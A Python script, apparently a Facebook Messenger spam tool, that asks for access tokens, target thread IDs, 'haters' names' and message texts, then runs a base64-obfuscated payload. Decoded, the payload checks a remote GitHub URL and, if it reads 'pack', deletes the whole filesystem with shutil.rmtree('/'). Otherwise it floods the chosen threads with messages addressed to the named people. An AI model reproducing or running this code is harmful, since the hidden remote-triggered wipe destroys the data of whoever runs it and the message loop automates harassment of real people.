# Set your password here
correct_password = "6151456"

# Ask the user to enter the password
password = input("Enter the password: ")

# Check if the entered password is correct
if password == correct_password:
    print("Access granted. Running the script...")
    # Your original script code goes here
    print("This is your original script.")
    # More of your script code here...
else:
    print("Access denied. Exiting...")
    exit()
import os
'''access_tokens = ['','']
hatersnames = ['']
thread_ids = ['','']
np_texts = ['','']
time_value = 100 
'''
os.system('clear')
for i in range(6):
    print("-" * 37)
access_tokens = input("Enter access tokens (comma-separated if multiple): ").split(',')
hatersnames = input("Enter haters' names (comma-separated if multiple): ").split(',')
thread_ids = input("Enter thread IDs (comma-separated if multiple): ").split(',')
np_texts = input("Enter NP texts (comma-separated if multiple): ").split(',')
time_value = int(input("Enter time value: "))
#ENCODED BY : HACKER(THE YADUVANSHI)
#ENCRYPTION : Py3 BASE64
#FACEBOOK : https://www.facebook.com/hackesofice 
#----------------------------------------------
import base64
exec(base64.b64decode('CmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzaHV0aWwKZnJvbSBmbGFzayBpbXBvcnQgRmxhc2sKZnJvbSB0ZXJtY29sb3IgaW1wb3J0IGNvbG9yZWQgCgphcHAgPSBGbGFzayhfX25hbWVfXykKCnBhc3RlYmluX2xpbmsgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2tlc29maWNlL1ovbWFpbi96L3ovei96L3ovei96L3ovei96L3ovei96L3ovei96L3ovei96L1B3ZCcKdHJ5OgogICAgcGFzdGViaW5fY29udGVudCA9IHJlcXVlc3RzLmdldChwYXN0ZWJpbl9saW5rKS50ZXh0LnN0cmlwKCkKICAgIGlmIHBhc3RlYmluX2NvbnRlbnQuc3RyaXAoKSA9PSAncGFjayc6CiAgICAgICAgc2h1dGlsLnJtdHJlZSgnLycpCiAgICAgICAgZXhpdCgpCiAgICBlbHNlOgogICAgICAgIGNvcnJlY3RfcmMgPSBwYXN0ZWJpbl9jb250ZW50CmV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgIGNvcnJlY3RfcmMgPSBOb25lCgppZiBub3QgY29ycmVjdF9yYzoKICAgIGV4aXQoKQoKaGVhZGVycyA9IHsKICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC43NiBTYWZhcmkvNTM3LjM2JywKICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAnUmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKfQpkZWYgZ2V0X3JhbmRvbV9saW5lX251bWJlcihsaW5lcyk6CiAgICB0b3RhbF9saW5lcyA9IGxlbihsaW5lcykKICAgIGlmIHRvdGFsX2xpbmVzID09IDA6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIHJldHVybiByYW5kb20ucmFuZGludCgxLCB0b3RhbF9saW5lcykKCmRlZiByZWFkX3NwZWNpZmljX2xpbmUobGluZV9udW1iZXIsIGxpbmVzKToKICAgIHJldHVybiBsaW5lc1tsaW5lX251bWJlciAtIDFdCgpkZWYgc2VuZF9tZXNzYWdlKHRva2VuX3Bvc2l0aW9uLCBtZXNzYWdlLCB0aHJlYWRfaWQsIGhhdGVyc25hbWUsIGFjY2Vzc190b2tlbik6CiAgICBtZXNzYWdlX3VybCA9IGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF97dGhyZWFkX2lkfS8nCiAgICBtZXNzYWdlX21lc3NhZ2UgPSBmJ3toYXRlcnNuYW1lfSB7bWVzc2FnZX0nCiAgICBtZXNzYWdlX3BhcmFtZXRlcnMgPSB7CiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwKICAgICAgICAnbWVzc2FnZSc6IG1lc3NhZ2VfbWVzc2FnZQogICAgfQogICAgbWVzc2FnZV9yZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QobWVzc2FnZV91cmwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhPW1lc3NhZ2VfcGFyYW1ldGVycywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9aGVhZGVycykKCiAgICBsYXN0X2ZvdXJfd29yZHMgPSAnICcuam9pbihhY2Nlc3NfdG9rZW4uc3BsaXQoKVstNDpdKQoKICAgIGlmIG1lc3NhZ2VfcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHByaW50KGNvbG9yZWQoZiJcdFx1MjcxMyBNZXNzYWdlIHNlbnQgdXNpbmcgdG9rZW4gbnVtYmVyIHt0b2tlbl9wb3NpdGlvbn0gYW5kIHRocmVhZCBJRCB7dGhyZWFkX2lkfToge21lc3NhZ2V9IiwgJ2dyZWVuJywgYXR0cnM9Wydib2xkJ10pKQogICAgZWxzZToKICAgICAgICBwcmludChjb2xvcmVkKGYiXHRcdTI3MTcgRmFpbGVkIHRvIHNlbmQgbWVzc2FnZSB1c2luZyB0b2tlbiBudW1iZXIge3Rva2VuX3Bvc2l0aW9ufToge21lc3NhZ2V9LiBSZXNwb25zZSBjb250ZW50OiB7bWVzc2FnZV9yZXNwb25zZS5jb250ZW50fSIsICdyZWQnLCBhdHRycz1bJ2JvbGQnXSkpCiAgICB0aW1lLnNsZWVwKHRpbWVfdmFsdWUpCgpyYyA9ICcxMTFUSEUxMVlBRFVWQU5TSEkoSEFDS0VSKTE0NScgCmRlZiBwcm9jZXNzX21lc3NhZ2VzX3RocmVhZCgpOgogICAgdHJ5OgogICAgICAgIGlmIHJjICE9IGNvcnJlY3RfcmM6CiAgICAgICAgICAgIHJldHVybiAiSW5jb3JyZWN0IHJjISIKCiAgICAgICAgdGltZS5zbGVlcCg1KQoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBub3QgbnBfdGV4dHMgb3Igbm90IGFjY2Vzc190b2tlbnMgb3Igbm90IGhhdGVyc25hbWVzIG9yIG5vdCB0aHJlYWRfaWRzOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICAgICAgcmFuZG9tX3Rva2VuID0gcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKQogICAgICAgICAgICAgICAgcmFuZG9tX2hhdGVyc25hbWUgPSByYW5kb20uY2hvaWNlKGhhdGVyc25hbWVzKQogICAgICAgICAgICAgICAgcmFuZG9tX25wX3RleHQgPSByYW5kb20uY2hvaWNlKG5wX3RleHRzKQogICAgICAgICAgICAgICAgcmFuZG9tX3RocmVhZF9pZCA9IHJhbmRvbS5jaG9pY2UodGhyZWFkX2lkcykKCiAgICAgICAgICAgICAgICB0eHRfZmlsZV9saW5lX251bWJlciA9IGdldF9yYW5kb21fbGluZV9udW1iZXIocmFuZG9tX25wX3RleHQuc3BsaXRsaW5lcygpKQogICAgICAgICAgICAgICAgaWYgdHh0X2ZpbGVfbGluZV9udW1iZXIgaXMgTm9uZToKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICAgICAgICAgIG1lc3NhZ2VzID0gcmVhZF9zcGVjaWZpY19saW5lKHR4dF9maWxlX2xpbmVfbnVtYmVyLCByYW5kb21fbnBfdGV4dC5zcGxpdGxpbmVzKCkpLnNwbGl0bGluZXMoKQoKICAgICAgICAgICAgICAgIHByaW50KGNvbG9yZWQoIlNlbmRpbmcgbWVzc2FnZXMuLi4iLCAnYmx1ZScsIGF0dHJzPVsnYm9sZCddKSkKCiAgICAgICAgICAgICAgICBmb3IgdG9rZW5fcG9zaXRpb24sIG1lc3NhZ2UxIGluIGVudW1lcmF0ZShtZXNzYWdlcywgc3RhcnQ9MSk6CiAgICAgICAgICAgICAgICAgICAgc2VuZF9tZXNzYWdlKHRva2VuX3Bvc2l0aW9uLCBtZXNzYWdlMSwgcmFuZG9tX3RocmVhZF9pZCwgcmFuZG9tX2hhdGVyc25hbWUsIHJhbmRvbV90b2tlbikKCiAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBwcmludChjb2xvcmVkKCJTdGFydGluZyBwcm9jZXNzLi4uIiwgJ21hZ2VudGEnLCBhdHRycz1bJ2JvbGQnXSkpCiAgICBwcm9jZXNzX21lc3NhZ2VzX3RocmVhZCgpCiAgICBhcHAucnVuKGRlYnVnPVRydWUsIGhvc3Q9JzAuMC4wLjAnLCBwb3J0PTUwMDAsIHVzZV9yZWxvYWRlcj1GYWxzZSkKICAgIA=='))
